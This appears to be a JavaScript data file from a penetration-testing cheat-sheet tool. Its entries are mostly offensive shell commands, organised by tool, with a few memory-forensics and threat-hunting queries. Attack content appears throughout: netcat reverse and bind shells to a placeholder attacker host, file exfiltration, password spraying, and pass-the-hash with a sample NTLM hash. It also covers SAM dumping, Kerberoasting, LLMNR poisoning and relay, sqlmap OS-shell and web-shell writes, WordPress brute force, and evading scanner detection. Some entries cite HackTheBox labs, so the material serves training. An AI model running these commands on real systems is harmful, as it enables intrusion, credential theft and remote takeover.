  {
    "command": "nc -lvnp 4444 rlwrap nc -lvnp 4444 ncat --ssl -lvnp 4444",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Listeners (Attacker Side)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc -e /bin/bash ATTACKER 4444           # Linux nc -e cmd.exe ATTACKER 4444             # Windows rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER 4444 >/tmp/f ncat ATTACKER 4444 -e cmd.exe",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Reverse Shells (Target Side)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' stty raw -echo; fg export TERM=xterm stty -a | head -1          # get rows/cols from your terminal stty rows 50 cols 200",
    "tool": "python",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Shell Stabilisation (After Getting a Shell)",
    "tags": "wiki python netcat"
  },
  {
    "command": "nc -lvnp 4444 -e /bin/bash nc TARGET 4444",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Bind Shell (Open Port on Target)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc -lvnp 9999 > received_file nc ATTACKER 9999 < /path/to/file nc -lvnp 9999 < file_to_send nc ATTACKER 9999 > /tmp/file",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "File Transfer via Netcat",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc -zv TARGET 80 nc -zv TARGET 1-1000 nc -zvu TARGET 53",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Port Scanning (Simple)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc -nv TARGET 22      # SSH banner nc -nv TARGET 25      # SMTP banner nc -nv TARGET 80      # HTTP banner (then send: GET / HTTP/1.0)",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Banner Grabbing",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc TARGET 25 EHLO test VRFY admin@domain.com      # user enumeration MAIL FROM: <attacker@test.com> RCPT TO: <user@target.com> DATA Subject: Test body here . QUIT",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "SMTP Interaction (Manual)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "mkfifo /tmp/pipe nc -lvnp 8080 < /tmp/pipe | nc INTERNAL_TARGET 80 > /tmp/pipe",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Relaying / Port Forwarding (with mkfifo)",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nc -lvnp 8080",
    "tool": "shell",
    "lab": "netcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Netcat is used to catch out-of-band callbacks during blind XSS or SSRF testing:",
    "tags": "wiki shell netcat"
  },
  {
    "command": "nmap -sC -sV -oN initial.txt TARGET nmap -p- -sV -sC -oN allports.txt TARGET nmap -p- --min-rate=1000 -T4 TARGET sudo nmap -sU --top-ports=20 -oN udp.txt TARGET nmap -p 22,80,443,445,3389 -sV -sC TARGET nmap --script vuln -p PORTS TARGET nmap -sn 192.168.1.0/24 nmap -O TARGET",
    "tool": "nmap",
    "lab": "nmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Scan Types",
    "tags": "wiki nmap nmap"
  },
  {
    "command": "-oN file.txt     # normal (human-readable) -oG file.gnmap   # grepable -oX file.xml     # XML -oA basename     # all three at once",
    "tool": "shell",
    "lab": "nmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Output Formats",
    "tags": "wiki shell nmap"
  },
  {
    "command": "nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 TARGET nmap --script http-enum,http-headers,http-methods -p 80,443 TARGET nmap --script ftp-anon,ftp-bounce,ftp-vuln* -p 21 TARGET nmap --script dns-zone-transfer -p 53 TARGET nmap -sU --script snmp-brute,snmp-info -p 161 TARGET nmap --script ssh-hostkey,ssh-auth-methods -p 22 TARGET nmap --script ms-sql-info,ms-sql-empty-password -p 1433 TARGET nmap --script mysql-empty-password,mysql-info -p 3306 TARGET nmap --script ldap-rootdse -p 389 TARGET nmap -sC --script vuln TARGET",
    "tool": "nmap",
    "lab": "nmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "NSE Scripts by Service",
    "tags": "wiki nmap nmap"
  },
  {
    "command": "nmap -p- --min-rate=5000 -T4 TARGET -oG quick.gnmap grep open quick.gnmap | awk -F/ '{print $1}' | tr '\\n' ',' nmap -p <ports> -sV -sC -A -oN deep.txt TARGET",
    "tool": "nmap",
    "lab": "nmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "One-Liner Recon Workflow",
    "tags": "wiki nmap nmap"
  },
  {
    "command": "nxc smb TARGET nxc smb TARGET -u user -p pass nxc smb TARGET -u '' -p '' nxc smb TARGET -u admin -H NTLM_HASH nxc smb TARGET -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "SMB \u2014 Core Commands",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc smb TARGET -u user -p pass --shares nxc smb TARGET -u user -p pass --users nxc smb TARGET -u user -p pass --groups nxc smb TARGET -u user -p pass --rid-brute nxc smb TARGET -u user -p pass --rid-brute | grep SidTypeUser nxc smb TARGET -u user -p pass --loggedon-users nxc smb TARGET -u user -p pass --local-admins nxc smb TARGET -u admin -p pass --sam nxc smb TARGET -u admin -p pass --lsa",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "Enumeration",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc winrm TARGET -u user -p pass nxc winrm TARGET -u user -p pass -x \"whoami\"",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "WinRM",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc ftp TARGET -u user -p pass nxc ftp TARGET -u user -p pass --ls",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "FTP",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc smb DC_IP -u users.txt -p 'Password123!' --continue-on-success nxc smb 192.168.1.0/24 -u admin -p 'Password123!' nxc smb DC_IP -u user -p pass --pass-pol",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "Password Spraying",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc smb TARGET -u admin -p pass -x \"whoami\" nxc smb TARGET -u admin -p pass -X \"Get-Process\"   # PowerShell nxc smb TARGET -u admin -p pass --exec-method smbexec -x \"whoami\"",
    "tool": "powershell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "Command Execution",
    "tags": "wiki powershell nxc"
  },
  {
    "command": "nxc ldap DC_IP -u user -p pass --asreproast asrep.txt nxc ldap DC_IP -u user -p pass --kerberoasting kerberoast.txt nxc ldap DC_IP -u user -p pass --users",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "LDAP (Active Directory)",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc smb 172.16.5.0/24 -u administrator -H NTLM_HASH --local-auth",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "Pass the Hash \u2014 Subnet Spray",
    "tags": "wiki shell nxc"
  },
  {
    "command": "nxc smb 172.16.5.5 -u valid_users.txt -p 'Password123!' --continue-on-success | grep + nxc smb DC_IP -u user -p pass --pass-pol",
    "tool": "shell",
    "lab": "nxc",
    "lab_url": "",
    "source": "wiki",
    "desc": "Password Spraying \u2014 AD Internal",
    "tags": "wiki shell nxc"
  },
  {
    "command": "responder -h git clone https://github.com/lgandx/Responder pip install -r requirements.txt",
    "tool": "shell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell responder"
  },
  {
    "command": "sudo responder -I eth0 sudo responder -I eth0 -A sudo responder -I eth0 -v sudo responder -I eth0 -w",
    "tool": "shell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell responder"
  },
  {
    "command": "ls /usr/share/responder/logs/ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt",
    "tool": "shell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "Captured Hash Location",
    "tags": "wiki shell responder"
  },
  {
    "command": "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt \\ /usr/share/wordlists/rockyou.txt hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
    "tool": "shell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "Cracking Captured Hashes",
    "tags": "wiki shell responder"
  },
  {
    "command": "nxc smb 172.16.5.0/24 --gen-relay-list relay_targets.txt impacket-ntlmrelayx -tf relay_targets.txt -smb2support sudo responder -I eth0",
    "tool": "shell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "If SMB signing is disabled on targets, captured hashes can be relayed rather than cracked:",
    "tags": "wiki shell responder"
  },
  {
    "command": "Import-Module .\\Inveigh.ps1 Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y .\\Inveigh.exe",
    "tool": "powershell",
    "lab": "responder",
    "lab_url": "",
    "source": "wiki",
    "desc": "Inveigh is a PowerShell/C# tool that performs the same LLMNR/NBT-NS poisoning from within Windows:",
    "tags": "wiki powershell responder"
  },
  {
    "command": "samdump2 SYSTEM SAM samdump2 SYSTEM SAM > hashes.txt",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "ls /mnt/windows/Windows/System32/config/ cp /mnt/windows/Windows/System32/config/SAM ./SAM cp /mnt/windows/Windows/System32/config/SYSTEM ./SYSTEM sudo mount -t cifs //TARGET/Backups /mnt/smb -o guest guestmount --add /mnt/smb/path/to/backup.vhd --inspector --ro /mnt/vhd cp /mnt/vhd/Windows/System32/config/SAM ./SAM cp /mnt/vhd/Windows/System32/config/SYSTEM ./SYSTEM samdump2 SYSTEM SAM",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "Getting SAM/SYSTEM Files",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "sudo apt install libguestfs-tools guestmount --add backup.vhd --inspector --ro /mnt/vhd sudo losetup -f backup.vhd --show   # \u2192 /dev/loop0 sudo mount /dev/loop0 /mnt/vhd sudo guestunmount /mnt/vhd sudo umount /mnt/vhd && sudo losetup -d /dev/loop0",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "VHD Mount Methods",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "Alternative: impacket-secretsdump (Offline)",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt evil-winrm -i TARGET -u administrator -H NTLM_HASH impacket-psexec -hashes :NTLM_HASH administrator@TARGET",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "Cracking the Hashes",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "smbclient //10.10.10.134/Backups -N sudo mount -t cifs //10.10.10.134/Backups /mnt/smb -o guest,vers=2.0 guestmount --add \"/mnt/smb/WindowsImageBackup/.../Backup.vhd\" \\ --inspector --ro /mnt/vhd cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM} ./ samdump2 SYSTEM SAM",
    "tool": "shell",
    "lab": "samdump2",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Bastion)",
    "tags": "wiki shell samdump2"
  },
  {
    "command": "pip install sigma-cli sigma convert -t splunk rule.yml sigma convert -t microsoft365defender rule.yml sigma convert -t azure-monitor rule.yml sigma list targets",
    "tool": "python",
    "lab": "sigma",
    "lab_url": "",
    "source": "wiki",
    "desc": "Converting Sigma Rules to SIEM Queries",
    "tags": "wiki python sigma"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" sqlmap -u \"http://TARGET/login.php\" --data=\"username=admin&password=test\" sqlmap -u \"http://TARGET/page.php?id=1&cat=2\" -p id sqlmap -u \"http://TARGET/page.php?id=1\" --cookie=\"PHPSESSID=abc123\" sqlmap -r request.txt",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" --dbs sqlmap -u \"http://TARGET/page.php?id=1\" -D database_name --tables sqlmap -u \"http://TARGET/page.php?id=1\" -D database_name -T table_name --dump sqlmap -u \"http://TARGET/page.php?id=1\" --dump-all sqlmap -u \"http://TARGET/page.php?id=1\" --current-user sqlmap -u \"http://TARGET/page.php?id=1\" --current-db",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Enumeration",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" --technique=T sqlmap -u \"http://TARGET/page.php?id=1\" --technique=B sqlmap -u \"http://TARGET/page.php?id=1\" --technique=BEUSTQ sqlmap -u \"http://TARGET/page.php?id=1\" --threads=5",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Blind SQLi Techniques",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" --level=5 --risk=3",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Level and Risk",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" --tables sqlmap -u \"http://TARGET/page.php?id=1\" --current-db sqlmap -u \"http://TARGET/page.php?id=1\" --dump-all",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "SQLite Specifics",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/page.php?id=1\" --file-read=\"/etc/passwd\" sqlmap -u \"http://TARGET/page.php?id=1\" --file-write=\"./shell.php\" --file-dest=\"/var/www/html/shell.php\" sqlmap -u \"http://TARGET/page.php?id=1\" --os-shell",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "File Operations (MySQL / MSSQL)",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://TARGET/\" --data=\"email=test@test.com\" -p email --technique=U --dump",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Authentication Bypass Patterns",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://cat.htb/accept_cat.php?catId=1\" \\ --cookie=\"PHPSESSID=stolen_session\" \\ --dbs sqlmap -u \"http://cat.htb/accept_cat.php?catId=1\" \\ --cookie=\"PHPSESSID=stolen_session\" \\ -D mydb -T users --dump",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Cat)",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "sqlmap -u \"http://trick.htb/index.php\" \\ --data=\"email=test@test.com\" \\ -p email --level=3 --risk=2 --dbs sqlmap -u \"http://trick.htb/index.php\" \\ --data=\"email=test@test.com\" \\ -p email -D trickdb --dump",
    "tool": "shell",
    "lab": "sqlmap",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Trick)",
    "tags": "wiki shell sqlmap"
  },
  {
    "command": "strings suspicious.exe strings -n 8 suspicious.exe strings -el suspicious.exe   # little-endian UTF-16 strings -eb suspicious.exe   # big-endian UTF-16 strings.exe -a suspicious.exe    # scan entire file (not just data sections) strings.exe -u suspicious.exe    # Unicode only",
    "tool": "shell",
    "lab": "strings",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell strings"
  },
  {
    "command": "git clone https://github.com/ShutdownRepo/targetedKerberoast pip install -r requirements.txt",
    "tool": "shell",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell targetedkerberoast"
  },
  {
    "command": "python targetedKerberoast.py -u user -p pass -d domain.com --dc-ip DC_IP python targetedKerberoast.py -u user -p pass -d domain.com --dc-ip DC_IP -o hashes.txt python targetedKerberoast.py -u user -p pass -d domain.com --dc-ip DC_IP --request-user targetuser python targetedKerberoast.py -u user -p pass -d domain.com --dc-ip DC_IP --only-rc4",
    "tool": "python",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Usage",
    "tags": "wiki python targetedkerberoast"
  },
  {
    "command": "python targetedKerberoast.py -u user --hashes LM:NT -d domain.com --dc-ip DC_IP",
    "tool": "python",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "With Pass the Hash",
    "tags": "wiki python targetedkerberoast"
  },
  {
    "command": "KRB5CCNAME=ticket.ccache python targetedKerberoast.py -k -d domain.com --dc-ip DC_IP",
    "tool": "shell",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "With Kerberos (ccache)",
    "tags": "wiki shell targetedkerberoast"
  },
  {
    "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
    "tool": "shell",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "Cracking the Output",
    "tags": "wiki shell targetedkerberoast"
  },
  {
    "command": "Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'} bloodyAD -u user -p pass -d domain.com --host DC_IP \\ set object targetuser servicePrincipalName -v \"fake/spn\" impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request -outputfile hash.txt Set-DomainObject -Identity targetuser -Clear serviceprincipalname",
    "tool": "powershell",
    "lab": "targetedkerberoast",
    "lab_url": "",
    "source": "wiki",
    "desc": "If the tool isn't available, the same attack can be done manually:",
    "tags": "wiki powershell targetedkerberoast"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 pslist vol.py -f memory.dmp --profile=Win10x64 pstree   # Tree view vol.py -f memory.dmp --profile=Win10x64 psscan   # Scan pool headers vol.py -f memory.dmp --profile=Win10x64 cmdline vol.py -f memory.dmp --profile=Win10x64 dlllist -p [PID] vol.py -f memory.dmp --profile=Win10x64 procdump -p [PID] --dump-dir ./",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Process Analysis",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 netscan vol.py -f memory.dmp --profile=Win10x64 connections   # (older profiles)",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Network Analysis",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 printkey -K \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" vol.py -f memory.dmp --profile=Win10x64 hivelist vol.py -f memory.dmp --profile=Win10x64 hivedump -o [offset] --dump-dir ./",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Registry Analysis",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 hashdump -y [SYSTEM offset] -s [SAM offset] vol.py -f memory.dmp --profile=Win10x64 cachedump",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Credential Extraction",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 malfind vol.py -f memory.dmp --profile=Win10x64 malfind --dump-dir ./ vol.py -f memory.dmp --profile=Win10x64 yarascan -Y \"MZ\"",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Malware Detection",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "vol.py -f memory.dmp --profile=Win10x64 strings -p [PID] vol.py -f memory.dmp --profile=Win10x64 filescan | grep -i \"interesting\" vol.py -f memory.dmp --profile=Win10x64 dumpfiles -Q [physical offset] --dump-dir ./",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Strings and File Extraction",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "python3 vol.py -f memory.dmp windows.pslist python3 vol.py -f memory.dmp windows.pstree python3 vol.py -f memory.dmp windows.netscan python3 vol.py -f memory.dmp windows.malfind python3 vol.py -f memory.dmp windows.registry.printkey --key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" python3 vol.py -f memory.dmp windows.hashdump",
    "tool": "volatility",
    "lab": "volatility",
    "lab_url": "",
    "source": "wiki",
    "desc": "Vol 3 Equivalents",
    "tags": "wiki volatility volatility"
  },
  {
    "command": "sudo gem install wpscan wpscan --update",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "wpscan --url http://TARGET/ wpscan --url http://TARGET/ --enumerate --api-token YOUR_API_TOKEN",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Scan",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "wpscan --url http://TARGET/ --enumerate vp,u --api-token TOKEN wpscan --url http://TARGET/ --enumerate ap --api-token TOKEN wpscan --url http://TARGET/ --enumerate u wpscan --url http://TARGET/ --enumerate cb",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Enumeration Flags",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "wpscan --url http://TARGET/ --enumerate --api-token TOKEN -o output.txt wpscan --url http://TARGET/ --enumerate --api-token TOKEN -f json -o results.json wpscan --url http://TARGET/ --max-scan-duration 300",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Output Options",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "wpscan --url http://TARGET/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt wpscan --url http://TARGET/ --usernames admin --passwords rockyou.txt --password-attack xmlrpc wpscan --url http://TARGET/ --usernames admin --passwords rockyou.txt --password-attack xmlrpc-multicall",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Brute Force (Login / XML-RPC)",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "curl -s http://TARGET/ | grep \"generator\" curl -s http://TARGET/readme.html curl -s http://TARGET/wp-content/plugins/PLUGINNAME/readme.txt curl -s http://TARGET/?author=1 -L | grep \"class=\\\"author\" curl http://TARGET/xmlrpc.php",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Manual Enumeration (No Tool)",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "wpscan --url http://TARGET/ --enumerate --random-user-agent",
    "tool": "shell",
    "lab": "wpscan",
    "lab_url": "",
    "source": "wiki",
    "desc": "Scanner user-agent WPScan in HTTP logs \u2014 easily detectable; use --random-user-agent",
    "tags": "wiki shell wpscan"
  },
  {
    "command": "xfreerdp /v:TARGET /u:administrator /p:'Password123!' xfreerdp /v:TARGET /u:domain\\\\user /p:'Password123!' xfreerdp /v:TARGET:3390 /u:user /p:pass xfreerdp /v:TARGET /u:user /p:pass /cert:ignore",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Connection",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH xfreerdp /v:TARGET /d:DOMAIN /u:administrator /pth:NTLM_HASH",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "Pass the Hash",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "xfreerdp /v:TARGET /u:user /p:pass /w:1920 /h:1080 xfreerdp /v:TARGET /u:user /p:pass /dynamic-resolution xfreerdp /v:TARGET /u:user /p:pass /f xfreerdp /v:TARGET /u:user /p:pass /drive:share,/local/path xfreerdp /v:TARGET /u:user /p:pass +clipboard xfreerdp /v:TARGET /u:user /p:pass /sec:tls",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "Quality of Life",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "xfreerdp3 /v:TARGET /u:user /p:pass /cert:ignore xfreerdp --version",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "FreeRDP 3 (xfreerdp3)",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "xfreerdp /v:10.10.11.X /u:kiosk /p:'' /cert:ignore",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Use (HTB Vulnescape)",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "xfreerdp3 /v:10.10.11.X /u:administrator /p:'AdminPassword!' \\ /cert:ignore /dynamic-resolution",
    "tool": "shell",
    "lab": "xfreerdp",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Use (HTB Lock)",
    "tags": "wiki shell xfreerdp"
  },
  {
    "command": "yara rule.yar suspicious_file.exe yara -r rule.yar /suspicious/directory/ yara rule.yar -p 1234     # specific PID yara rules/ suspicious_file.exe yara -s rule.yar file.exe vol.py -f memory.dmp --profile=Win10x64 yarascan --yara-file=rule.yar",
    "tool": "volatility",
    "lab": "yara",
    "lab_url": "",
    "source": "wiki",
    "desc": "Running YARA",
    "tags": "wiki volatility yara"
  },
  {
    "command": "cat conn.log | zeek-cut id.resp_h | sort -u cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto | grep \"4444\\|1337\\|9001\" cat dns.log | zeek-cut query | awk 'length($1) > 30' cat http.log | zeek-cut id.orig_h id.resp_h uri method | grep POST cat ssl.log | zeek-cut id.orig_h id.resp_h ja3 ja3s server_name cat files.log | zeek-cut fuid md5 mime_type | grep \"application/x-dosexec\" cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes | sort -k3 -rn | head -20 cat conn.log | zeek-cut id.orig_h id.resp_h ts | awk '{print $3}' | sort | uniq -c",
    "tool": "zeek",
    "lab": "zeek",
    "lab_url": "",
    "source": "wiki",
    "desc": "Key Threat Hunting Queries (with zeek-cut or awk)",
    "tags": "wiki zeek zeek"
  }
];

const COMMANDS_META = {
  "total": 313,
  "labs": 51,
  "tools": [
    "grep",
    "kql",
    "nmap",
    "powershell",
    "python",
    "shell",
    "splunk",
    "sql",
    "volatility",
    "wireshark",
    "zeek"
  ]
};
